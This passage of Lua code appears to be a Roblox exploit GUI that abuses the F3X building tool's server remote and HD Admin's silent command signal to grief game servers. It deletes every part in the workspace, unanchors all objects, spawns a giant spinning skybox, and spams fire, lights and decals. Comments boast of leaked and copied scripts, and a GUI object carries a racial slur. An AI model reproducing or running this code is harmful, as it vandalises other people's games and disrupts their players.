				targetR = torso.CFrame * CFrame.new(1.9,0.5,0) * CFrame.Angles(-flapX, -flapY, -idleAngles.Z - flapZ)  
	
			end  
	
	
	
			larm.CFrame = targetL  
	
			rarm.CFrame = targetR
	
		end)
	
	
	
		if server then
	
			spawn(function()
	
				while true do
	
					if larm and rarm then
	
						server:InvokeServer("SyncMove", {{Part = larm, CFrame = larm.CFrame}})
	
						server:InvokeServer("SyncMove", {{Part = rarm, CFrame = rarm.CFrame}})
	
					end
	
					task.wait()
	
				end
	
			end)
	
		end
	
		
		
		
		
		
		
		
		
		
		
		
		
		
		
	end)
	
end;
task.spawn(C_15);
-- StarterGui.ScreenGui.nigg.ScrollingFrame.TextButton.LocalScript
local function C_17()
local script = G2L["17"];
	script.Parent.MouseButton1Click:Connect(function()
		
		
		
		
		local ReplicatedStorage = game:GetService("ReplicatedStorage")
		local RequestCommandSilent = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
	
		RequestCommandSilent:InvokeServer(";fogcolor black")
		RequestCommandSilent:InvokeServer(";time 010")
	
	--[[ 
	ok vro cuz my script have errors with getgenv and obfuscators not working,here the source.
	== Epik spinning sky f3x By ItsKittyyyGD ==
	Dont skid and give credit plz
	also reuploaded cuz scriptblox put my script on scripts f3x of 2024 
	]]
		-- { SOURCE: } --
	
	
		local Players = game:GetService("Players")
		local RunService = game:GetService("RunService")
		local player = Players.LocalPlayer
		local character = player.Character or player.CharacterAdded:Wait()
		local tool
	
		for _, obj in player:GetDescendants() do
			if obj.Name == "SyncAPI" then
				tool = obj.Parent
			end
		end
	
		for _, obj in game.ReplicatedStorage:GetDescendants() do
			if obj.Name == "SyncAPI" then
				tool = obj.Parent
			end
		end
	
		local SyncAPI = tool.SyncAPI
		local part
		local baseCF
		local angle = 0
		local connection
	
		local function _(args)
			SyncAPI:Invoke(unpack(args))
		end
	
		local function CreatePart(cf, parent)
			local args = {
				[1] = "CreatePart",
				[2] = "Normal",
				[3] = cf,
				[4] = parent
			}
			_(args)
		end
	
		local function SetAnchor(p, anchored)
			local args = {
				[1] = "SyncAnchor",
				[2] = {
					[1] = {
						["Part"] = p,
						["Anchored"] = anchored
					}
				}
			}
			_(args)
		end
	
		local function AddMesh(p)
			local args = {
				[1] = "CreateMeshes",
				[2] = {
					[1] = {
						["Part"] = p
					}
				}
			}
			_(args)
		end
	
		local function SetMesh(p, meshId)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = p,
						["MeshId"] = "rbxassetid://"..meshId
					}
				}
			}
			_(args)
		end
	
		local function SetTexture(p, textureId)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = p,
						["TextureId"] = textureId
					}
				}
			}
			_(args)
		end
	
		local function ResizeMesh(p, size)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = p,
						["Scale"] = size
					}
				}
			}
			_(args)
		end
	
		local function SetTransparency(p, value)
			local args = {
				[1] = "SyncTransparency",
				[2] = {
					[1] = {
						["Part"] = p,
						["Transparency"] = value
					}
				}
			}
			_(args)
		end
	
		local function SyncRotate(cf)
			if not part or not part.Parent then return end
			local args = {
				[1] = "SyncRotate",
				[2] = {
					[1] = {
						["Part"] = part,
						["CFrame"] = cf
					}
				}
			}
			_(args)
		end
	
		local function Sky()
			local hrp = character:FindFirstChild("HumanoidRootPart")
			if not hrp then return end
			local startCF = hrp.CFrame + Vector3.new(0,6,0)
			CreatePart(startCF, workspace)
			for _, obj in workspace:GetDescendants() do
				if obj:IsA("BasePart") and (obj.Position - startCF.Position).Magnitude < 0.1 then
					part = obj
					baseCF = part.CFrame
					SetAnchor(part,true)
					AddMesh(part)
					SetMesh(part,"111891702759441")
					SetTexture(part,"rbxassetid://72931977292193")
					ResizeMesh(part, Vector3.new(6000,6000,6000))
					SetTransparency(part,0)
					-- i think you taking this so give credit
					local rotation = math.rad(100)
					connection = RunService.Heartbeat:Connect(function(dt)
						if not part or not part.Parent then
							if connection then
								connection:Disconnect()
								connection = nil
							end
							return
						end
						angle += rotation * dt
						local cf = baseCF * CFrame.Angles(5, angle, 1)
						SyncRotate(cf)
						part.CFrame = cf
					end)
					break
				end
			end
		end
	
		Sky()
		
		
		
		
		
		
		
		
		
		
		
		
		
	end)
	
end;
task.spawn(C_17);
-- StarterGui.ScreenGui.nigg.ScrollingFrame.TextButton.LocalScript
local function C_19()
local script = G2L["19"];
	script.Parent.MouseButton1Click:Connect(function()
		
		
		local ReplicatedStorage = game:GetService("ReplicatedStorage")
		local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
		local player = game.Players.LocalPlayer
		local char = player.Character
		local backpack = player.Backpack
	
		local Players = game:GetService("Players")
		local player = Players.LocalPlayer
	
		local character = player.Character or player.CharacterAdded:Wait()
	
		local storedCharacter = character
		local originalParent = storedCharacter.Parent
	
		storedCharacter.Parent = nil
	
		local player = game.Players.LocalPlayer
		local char = player.Character
		local backpack = player.Backpack
	
		local function getf3x()
			for _, v in ipairs(backpack:GetChildren()) do
				if v:FindFirstChild("SyncAPI") then
					return v
				end
			end
			for _, v in ipairs(char:GetChildren()) do
				if v:FindFirstChild("SyncAPI") then
					return v
				end
			end
	
			return nil
		end
	
		-- get all info
	
		local f3x = getf3x()
		if not f3x then
			warn("you dont have f3x skid")
		end
		local syncapi = f3x.SyncAPI
		local serverendpoint = syncapi.ServerEndpoint
	
		local function delete(part)
			local args = {
				[1] = "Remove",
				[2] = {
					[1] = part
				}
			}
			serverendpoint:InvokeServer(unpack(args))
		end
	
		local function deleteall()
			for _, v in ipairs(workspace:GetDescendants()) do
				if v:IsA("BasePart") or v:IsA("UnionOperation") then
					spawn(function()
						delete(v)
					end)
				end
			end
		end
	
		deleteall()
	
		local function getf3x()
			for _, v in ipairs(backpack:GetChildren()) do
				if v:FindFirstChild("SyncAPI") then
					return v
				end
			end
			for _, v in ipairs(char:GetChildren()) do
				if v:FindFirstChild("SyncAPI") then
					return v
				end
			end
			return nil
		end
	
		local f3x = getf3x()
		if not f3x then
			warn("you dont have f3x skid")
		end
		local syncapi = f3x.SyncAPI
		local serverendpoint = syncapi.ServerEndpoint
	
		function _(args)
			serverendpoint:InvokeServer(unpack(args))
		end
	
		local function addlight(part, brightness)
			local args = {
				[1] = "CreateLights",
				[2] = {
					[1] = {
						["Part"] = part,
						["LightType"] = "PointLight"
					}
				}
			}
			serverendpoint:InvokeServer(unpack(args))
		end
	
		local function synclight(part, brightness)
			local args = {
				[1] = "SyncLighting",
				[2] = {
					[1] = {
						["Part"] = part,
						["LightType"] = "PointLight",
						["Range"] = 60,
						["Color"] = Color3.new(1, 0, 0)
					}
				}
			}
			serverendpoint:InvokeServer(unpack(args))
		end
	
		local function fire(part) 
	
			local argsCreate = {
				[1] = "CreateDecorations",
				[2] = {
					[1] = {
						["Part"] = part,
						["DecorationType"] = "Fire"
					}
				}
			}
	
	
			local argsSync = {
				[1] = "SyncDecorate",
				[2] = {
					[1] = {
						["Part"] = part,
						["DecorationType"] = "Fire",
						["Size"] = 30,
						["Heat"] = 9,
						["Color"] = Color3.fromRGB(255, 0, 0), 
						["SecondaryColor"] = Color3.fromRGB(255, 0, 0) 
					} 
				} 
			}
	
	
			_(argsCreate)
			_(argsSync)
		end
		function MovePart(part, cf)
			local args = {
				"SyncMove",
				{
					{
						Part = part,
						CFrame = cf
					}
				}
			}
			_(args)
		end
	
		local function resize(part, size, cf)
			local args = {
				"SyncResize",
				{
					{
						Part = part,
						CFrame = cf,
						Size = size
					}
				}
			}
			_(args)
		end
	
		function SetTrans(part,int)
			local args = {
				[1] = "SyncMaterial",
				[2] = {
					[1] = {
						["Part"] = part,
						["Transparency"] = int
					}
				}
			}
			_(args)
		end
	
		local function mat(part, mate)
			local args = {
				"SyncMaterial",
				{
					{
						Part = part,
						Material = mate
					}
				}
			}
			_(args)
		end
	
		local function transparency(part, trans)
			local args = {
				"SyncMaterial",
				{
					{
						Part = part,
						Transparency = trans
					}
				}
			}
			_(args)
		end
	
		local function color(part, color)
			local args = {
				"SyncColor",
				{
					{
						Part = part,
						Color = color,
						UnionColoring = false
					}
				}
			}
			_(args)
		end
	
		local function syncmeshid(part, id)
			local args = {
				"SyncMesh",
				{
					{
						Part = part,
						MeshId = "rbxassetid://" .. id
					}
				}
			}
			_(args)
		end
	
		local function makemesh(part)
			local args = {
				"CreateMeshes",
				{
					{
						Part = part
					}
				}
			}
			_(args)
		end
	
		local function syncmeshsize(part, vectora)
			local args = {
				"SyncMesh",
				{
					{
						Part = part,
						Scale = vectora
					}
				}
			}
			_(args)
		end
	
		local function syncmeshtexture(part, id)
			local args = {
				"SyncMesh",
				{
					{
						Part = part,
						TextureId = "rbxassetid://" .. id
					}
				}
			}
			_(args)
		end
	
		local function name(part, stringa)
			local args = {
				"SetName",
				{ part },
				stringa
			}
			_(args)
		end
	
		local function lock(part, boolean)
			local args = {
				"SetLocked",
				{ part },
				boolean
			}
			_(args)
		end
	
	
	
		local function setcollision(part, booleana)
			local args = {
				"SyncCollision",
				{
					{
						Part = part,
						CanCollide = booleana
					}
				}
			}
			_(args)
		end
	
		local function setanchor(part, boolean)
			local args = {
				"SyncAnchor",
				{
					{
						Part = part,
						Anchored = boolean
					}
				}
			}
			_(args)
		end
	
		local function createdecal(part, side)
			local args = {
				"CreateTextures",
				{
					{
						Part = part,
						Face = side,
						TextureType = "Decal"
					}
				}
			}
			_(args)
		end
	
		local function setdecal(part, asset, side)
			local args = {
				"SyncTexture",
				{
					{
						Part = part,
						Face = side,
						TextureType = "Decal",
						Texture = "rbxassetid://" .. asset
					}
				}
			}
			_(args)
		end
	
		function toptexturecreate(part)
			local args = {
				[1] = "CreateTextures",
				[2] = {
					[1] = {
						["Part"] = part,
						["Face"] = Enum.NormalId.Top,
						["TextureType"] = "Texture"
					}
				}
			}
	
			_(args)
		end
		function toptextureadd(part)
			local args = {
				[1] = "SyncTexture",
				[2] = {
					[1] = {
						["Part"] = part,
						["Face"] = Enum.NormalId.Top,
						["TextureType"] = "Texture",
						["Texture"] = "rbxassetid://13199422086",
						["StudsPerTileV"] = 2,
						["StudsPerTileU"] = 2
					}
				}
			}
			_(args)
		end
	
		local function RealmV2()
			local position = CFrame.new(0, 0, 0)
			local base = serverendpoint:InvokeServer("CreatePart", "Normal", position, workspace)
			resize(base, Vector3.new(1000, 1, 1000), position)
			toptexturecreate(base)
			toptextureadd(base)
			color(base, Color3.fromRGB(0, 150, 0))
	
		end
		local function unanchorall()
			for _, v in ipairs(workspace:GetDescendants()) do
				if v:IsA("BasePart") or v:IsA("UnionOperation") then
					spawn(function()
						lock(v, false)
						setanchor(false, v)
					end)
				end
			end
		end
	
		local function realm()
			unanchorall()
			RealmV2()
		end
		realm()
		wait(1)
		storedCharacter.Parent = game.workspace
	
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
	end)
	
end;
task.spawn(C_19);
-- StarterGui.ScreenGui.nigg.ScrollingFrame.TextButton.LocalScript
local function C_1b()
local script = G2L["1b"];
	script.Parent.MouseButton1Click:Connect(function()
		
		
		
		
		
		
		--[[
	Lskidderthedestroyer últimate skidded f3x v2 leaked by t.a.x and other people:
	(tuboos93_revivial👑),protokidd,
	special thanks to L3AKN4TION64 
	WE ARE ON TOP!
	]]
		local G2L = {};
	
		-- StarterGui.v2
		G2L["1"] = Instance.new("ScreenGui", game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui"));
		G2L["1"]["Name"] = [[v2]];
		G2L["1"]["ZIndexBehavior"] = Enum.ZIndexBehavior.Sibling;
		G2L["1"]["ResetOnSpawn"] = false;
	
	
		-- StarterGui.v2.Frame
		G2L["2"] = Instance.new("Frame", G2L["1"]);
		G2L["2"]["BorderSizePixel"] = 3;
		G2L["2"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["2"]["Size"] = UDim2.new(0, 400, 0, 430);
		G2L["2"]["Position"] = UDim2.new(0.21886, 0, 0.21533, 0);
		G2L["2"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["2"]["BackgroundTransparency"] = 0.05;
	
	
		-- StarterGui.v2.Frame.TextLabel
		G2L["3"] = Instance.new("TextLabel", G2L["2"]);
		G2L["3"]["BorderSizePixel"] = 2;
		G2L["3"]["TextSize"] = 25;
		G2L["3"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["3"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
		G2L["3"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["3"]["BackgroundTransparency"] = 0.05;
		G2L["3"]["Size"] = UDim2.new(0, 400, 0, 43);
		G2L["3"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["3"]["Text"] = [[LNicky F3X Ultimate GUI v2]];
	
	
		-- StarterGui.v2.Frame.TextLabel
		G2L["4"] = Instance.new("TextLabel", G2L["2"]);
		G2L["4"]["BorderSizePixel"] = 0;
		G2L["4"]["TextSize"] = 30;
		G2L["4"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["4"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
		G2L["4"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["4"]["BackgroundTransparency"] = 1;
		G2L["4"]["Size"] = UDim2.new(0, 400, 0, 50);
		G2L["4"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["4"]["Text"] = [[----- [ F3X Scripts ] -----]];
		G2L["4"]["Position"] = UDim2.new(0, 0, 0.10009, 0);
	
	
		-- StarterGui.v2.Frame.ScrollingFrame
		G2L["5"] = Instance.new("ScrollingFrame", G2L["2"]);
		G2L["5"]["Active"] = true;
		G2L["5"]["BorderSizePixel"] = 2;
		G2L["5"]["CanvasPosition"] = Vector2.new(0, 280);
		G2L["5"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["5"]["Size"] = UDim2.new(0, 400, 0, 148);
		G2L["5"]["ScrollBarImageColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["5"]["Position"] = UDim2.new(0, 0, 0.21838, 0);
		G2L["5"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["5"]["ScrollBarThickness"] = 0;
		G2L["5"]["BackgroundTransparency"] = 0.05;
	
	
		-- StarterGui.v2.Frame.ScrollingFrame.UIGridLayout
		G2L["6"] = Instance.new("UIGridLayout", G2L["5"]);
		G2L["6"]["HorizontalAlignment"] = Enum.HorizontalAlignment.Center;
		G2L["6"]["CellSize"] = UDim2.new(0, 90, 0, 30);
		G2L["6"]["FillDirectionMaxCells"] = 4;
		G2L["6"]["SortOrder"] = Enum.SortOrder.LayoutOrder;
		G2L["6"]["CellPadding"] = UDim2.new(0, 13, 0, 13);
	
	
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton
		G2L["7"] = Instance.new("TextButton", G2L["5"]);
		G2L["7"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["7"]["TextSize"] = 20;
		G2L["7"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["7"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
		G2L["7"]["Size"] = UDim2.new(0, 90, 0, 35);
		G2L["7"]["ClipsDescendants"] = true;
		G2L["7"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["7"]["Text"] = [[SkyBox]];
		G2L["7"]["Position"] = UDim2.new(0.0125, 0, 0.25, 0);
	
	
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton.LocalScript
		G2L["8"] = Instance.new("LocalScript", G2L["7"]);
	
	
	
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton
		G2L["9"] = Instance.new("TextButton", G2L["5"]);
		G2L["9"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["9"]["TextSize"] = 20;
		G2L["9"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["9"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
		G2L["9"]["Size"] = UDim2.new(0, 90, 0, 35);
		G2L["9"]["ClipsDescendants"] = true;
		G2L["9"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["9"]["Text"] = [[Decal Spam]];
		G2L["9"]["Position"] = UDim2.new(0.25875, 0, 0, 0);
	
	
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton.LocalScript
		G2L["a"] = Instance.new("LocalScript", G2L["9"]);
	
	
	
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton
		G2L["b"] = Instance.new("TextButton", G2L["5"]);
		G2L["b"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["b"]["TextSize"] = 20;
		G2L["b"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["b"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
		G2L["b"]["Size"] = UDim2.new(0, 90, 0, 35);
		G2L["b"]["ClipsDescendants"] = true;
		G2L["b"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["b"]["Text"] = [[Disco]];
		G2L["b"]["Position"] = UDim2.new(0.5125, 0, 0.25, 0);
	
	
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton.LocalScript
		G2L["c"] = Instance.new("LocalScript", G2L["b"]);
	
	
	
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton
		G2L["d"] = Instance.new("TextButton", G2L["5"]);
		G2L["d"]["TextWrapped"] = true;
		G2L["d"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["d"]["TextSize"] = 20;
		G2L["d"]["TextScaled"] = true;
		G2L["d"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["d"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
		G2L["d"]["Size"] = UDim2.new(0, 90, 0, 35);
		G2L["d"]["ClipsDescendants"] = true;
		G2L["d"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["d"]["Text"] = [[Unanchor All]];
		G2L["d"]["Position"] = UDim2.new(0.7625, 0, 0.25, 0);
	
	
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton.LocalScript
		G2L["e"] = Instance.new("LocalScript", G2L["d"]);
	
	
	
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton
		G2L["f"] = Instance.new("TextButton", G2L["5"]);
		G2L["f"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["f"]["TextSize"] = 20;
		G2L["f"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["f"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
		G2L["f"]["Size"] = UDim2.new(0, 90, 0, 35);
		G2L["f"]["ClipsDescendants"] = true;
		G2L["f"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["f"]["Text"] = [[Message]];
		G2L["f"]["Position"] = UDim2.new(0.0125, 0, 0.25, 0);
	
	
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton.LocalScript
		G2L["10"] = Instance.new("LocalScript", G2L["f"]);
	
	
	
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton
		G2L["11"] = Instance.new("TextButton", G2L["5"]);
		G2L["11"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["11"]["TextSize"] = 20;
		G2L["11"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["11"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
		G2L["11"]["Size"] = UDim2.new(0, 90, 0, 35);
		G2L["11"]["ClipsDescendants"] = true;
		G2L["11"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["11"]["Text"] = [[Hint]];
		G2L["11"]["Position"] = UDim2.new(0.2625, 0, 0.25, 0);
	
	
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton.LocalScript
		G2L["12"] = Instance.new("LocalScript", G2L["11"]);
	
	
	
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton
		G2L["13"] = Instance.new("TextButton", G2L["5"]);
		G2L["13"]["TextWrapped"] = true;
		G2L["13"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["13"]["TextSize"] = 20;
		G2L["13"]["TextScaled"] = true;
		G2L["13"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["13"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
		G2L["13"]["Size"] = UDim2.new(0, 90, 0, 35);
		G2L["13"]["ClipsDescendants"] = true;
		G2L["13"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["13"]["Text"] = [[Raining LNicky]];
		G2L["13"]["Position"] = UDim2.new(0.5125, 0, 0.25, 0);
	
	
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton.LocalScript
		G2L["14"] = Instance.new("LocalScript", G2L["13"]);
	
	
	
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton
		G2L["15"] = Instance.new("TextButton", G2L["5"]);
		G2L["15"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["15"]["TextSize"] = 20;
		G2L["15"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["15"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
		G2L["15"]["Size"] = UDim2.new(0, 90, 0, 35);
		G2L["15"]["ClipsDescendants"] = true;
		G2L["15"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["15"]["Text"] = [[666]];
		G2L["15"]["Position"] = UDim2.new(0.77375, 0, 0.30714, 0);
	
	
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton.LocalScript
		G2L["16"] = Instance.new("LocalScript", G2L["15"]);
	
	
	
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton.LocalScript
		G2L["17"] = Instance.new("LocalScript", G2L["15"]);
	
	
	
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton.LocalScript
		G2L["18"] = Instance.new("LocalScript", G2L["15"]);
	
	
	
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton.LocalScript
		G2L["19"] = Instance.new("LocalScript", G2L["15"]);
	
	
	
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton
		G2L["1a"] = Instance.new("TextButton", G2L["5"]);
		G2L["1a"]["TextWrapped"] = true;
		G2L["1a"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["1a"]["TextSize"] = 20;
		G2L["1a"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["1a"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
		G2L["1a"]["Size"] = UDim2.new(0, 90, 0, 35);
		G2L["1a"]["ClipsDescendants"] = true;
		G2L["1a"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["1a"]["Text"] = [[SkyBox 2]];
		G2L["1a"]["Position"] = UDim2.new(0.0125, 0, 0.25, 0);
	
	
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton.LocalScript
		G2L["1b"] = Instance.new("LocalScript", G2L["1a"]);
	
	
	
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton
		G2L["1c"] = Instance.new("TextButton", G2L["5"]);
		G2L["1c"]["TextWrapped"] = true;
		G2L["1c"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["1c"]["TextSize"] = 20;
		G2L["1c"]["TextScaled"] = true;
		G2L["1c"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["1c"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
		G2L["1c"]["Size"] = UDim2.new(0, 90, 0, 35);
		G2L["1c"]["ClipsDescendants"] = true;
		G2L["1c"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["1c"]["Text"] = [[Decal Spam 2]];
		G2L["1c"]["Position"] = UDim2.new(0.2625, 0, 0.25, 0);
	
	
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton.LocalScript
		G2L["1d"] = Instance.new("LocalScript", G2L["1c"]);
	
	
	
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton
		G2L["1e"] = Instance.new("TextButton", G2L["5"]);
		G2L["1e"]["TextWrapped"] = true;
		G2L["1e"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["1e"]["TextSize"] = 20;
		G2L["1e"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["1e"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
		G2L["1e"]["Size"] = UDim2.new(0, 90, 0, 35);
		G2L["1e"]["ClipsDescendants"] = true;
		G2L["1e"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["1e"]["Text"] = [[Red Lights]];
		G2L["1e"]["Position"] = UDim2.new(0.5125, 0, 0.25, 0);
	
	
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton.LocalScript
		G2L["1f"] = Instance.new("LocalScript", G2L["1e"]);
	
	
	
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton
		G2L["20"] = Instance.new("TextButton", G2L["5"]);
		G2L["20"]["TextWrapped"] = true;
		G2L["20"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["20"]["TextSize"] = 20;
		G2L["20"]["TextScaled"] = true;
		G2L["20"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["20"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
		G2L["20"]["Size"] = UDim2.new(0, 90, 0, 35);
		G2L["20"]["ClipsDescendants"] = true;
		G2L["20"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["20"]["Text"] = [[Rotate Spam]];
		G2L["20"]["Position"] = UDim2.new(0.7625, 0, 0.25, 0);
	
	
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton.LocalScript
		G2L["21"] = Instance.new("LocalScript", G2L["20"]);
	
	
	
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton
		G2L["22"] = Instance.new("TextButton", G2L["5"]);
		G2L["22"]["TextWrapped"] = true;
		G2L["22"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["22"]["TextSize"] = 20;
		G2L["22"]["TextScaled"] = true;
		G2L["22"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["22"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
		G2L["22"]["Size"] = UDim2.new(0, 90, 0, 35);
		G2L["22"]["ClipsDescendants"] = true;
		G2L["22"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["22"]["Text"] = [[Invisible Parts]];
		G2L["22"]["Position"] = UDim2.new(0.0125, 0, 0.25, 0);
	
	
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton.LocalScript
		G2L["23"] = Instance.new("LocalScript", G2L["22"]);
	
	
	
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton
		G2L["24"] = Instance.new("TextButton", G2L["5"]);
		G2L["24"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["24"]["TextSize"] = 20;
		G2L["24"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["24"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
		G2L["24"]["Size"] = UDim2.new(0, 90, 0, 35);
		G2L["24"]["ClipsDescendants"] = true;
		G2L["24"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["24"]["Text"] = [[Fire All]];
		G2L["24"]["Position"] = UDim2.new(0.2625, 0, 0.25, 0);
	
	
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton.LocalScript
		G2L["25"] = Instance.new("LocalScript", G2L["24"]);
	
	
	
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton
		G2L["26"] = Instance.new("TextButton", G2L["5"]);
		G2L["26"]["TextWrapped"] = true;
		G2L["26"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["26"]["TextSize"] = 20;
		G2L["26"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["26"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
		G2L["26"]["Size"] = UDim2.new(0, 90, 0, 35);
		G2L["26"]["ClipsDescendants"] = true;
		G2L["26"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["26"]["Text"] = [[Smoke All]];
		G2L["26"]["Position"] = UDim2.new(0.5125, 0, 0.25, 0);
	
	
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton.LocalScript
		G2L["27"] = Instance.new("LocalScript", G2L["26"]);
	
	
	
